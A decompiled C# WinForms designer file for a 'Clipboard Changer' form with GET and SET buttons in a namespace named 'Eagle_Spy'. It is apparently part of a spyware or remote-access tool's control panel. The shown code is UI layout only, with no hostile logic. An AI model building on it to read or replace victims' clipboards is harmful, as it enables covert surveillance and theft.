namespace Eagle_Spy
{
	// Token: 0x0200002E RID: 46
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class ClipboardManager : global::System.Windows.Forms.Form
	{
		// Token: 0x06000385 RID: 901 RVA: 0x000509EC File Offset: 0x0004EBEC
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000386 RID: 902 RVA: 0x00050A2C File Offset: 0x0004EC2C
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.label1 = new global::System.Windows.Forms.Label();
			this.BoxClipboard = new global::System.Windows.Forms.TextBox();
			this.BTN_SET = new global::System.Windows.Forms.Button();
			this.BTN_GET = new global::System.Windows.Forms.Button();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			base.SuspendLayout();
			this.TOpacity.Interval = 1;
			this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Bahnschrift SemiBold", 15.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.White;
			this.label1.Location = new global::System.Drawing.Point(78, 27);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(185, 25);
			this.label1.TabIndex = 4;
			this.label1.Text = "Clipboard Changer";
			this.BoxClipboard.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.BoxClipboard.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.BoxClipboard.ForeColor = global::System.Drawing.Color.White;
			this.BoxClipboard.Location = new global::System.Drawing.Point(25, 70);
			this.BoxClipboard.Multiline = true;
			this.BoxClipboard.Name = "BoxClipboard";
			this.BoxClipboard.Size = new global::System.Drawing.Size(313, 149);
			this.BoxClipboard.TabIndex = 0;
			this.BTN_SET.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.BTN_SET.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.BTN_SET.ForeColor = global::System.Drawing.Color.Red;
			this.BTN_SET.Location = new global::System.Drawing.Point(206, 234);
			this.BTN_SET.Name = "BTN_SET";
			this.BTN_SET.Size = new global::System.Drawing.Size(105, 40);
			this.BTN_SET.TabIndex = 3;
			this.BTN_SET.Text = "SET";
			this.BTN_SET.UseVisualStyleBackColor = true;
			this.BTN_SET.Click += new global::System.EventHandler(this.BTN_SET_Click);
			this.BTN_GET.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.BTN_GET.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.BTN_GET.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			this.BTN_GET.Location = new global::System.Drawing.Point(35, 234);
			this.BTN_GET.Name = "BTN_GET";
			this.BTN_GET.Size = new global::System.Drawing.Size(90, 40);
			this.BTN_GET.TabIndex = 1;
			this.BTN_GET.Text = "GET";
			this.BTN_GET.UseVisualStyleBackColor = true;
			this.BTN_GET.Click += new global::System.EventHandler(this.BTN_GET_Click);
			this.guna2BorderlessForm1.BorderRadius = 15;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(318, 12);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 5;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			base.ClientSize = new global::System.Drawing.Size(375, 308);
			base.Controls.Add(this.guna2ControlBox1);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.BTN_SET);
			base.Controls.Add(this.BoxClipboard);
			base.Controls.Add(this.BTN_GET);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.Name = "ClipboardManager";
			base.Opacity = 0.0;
			this.Text = "ClipboardManager";
			base.TopMost = true;
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000310 RID: 784
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000315 RID: 789
		internal global::System.Windows.Forms.Timer TOpacity;

		// Token: 0x04000316 RID: 790
		internal global::System.Windows.Forms.Button BTN_GET;

		// Token: 0x04000317 RID: 791
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("BoxClipboard")]
		internal global::System.Windows.Forms.TextBox BoxClipboard;

		// Token: 0x04000318 RID: 792
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000319 RID: 793
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x0400031A RID: 794
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x0400031B RID: 795
		internal global::System.Windows.Forms.Button BTN_SET;
	}
}
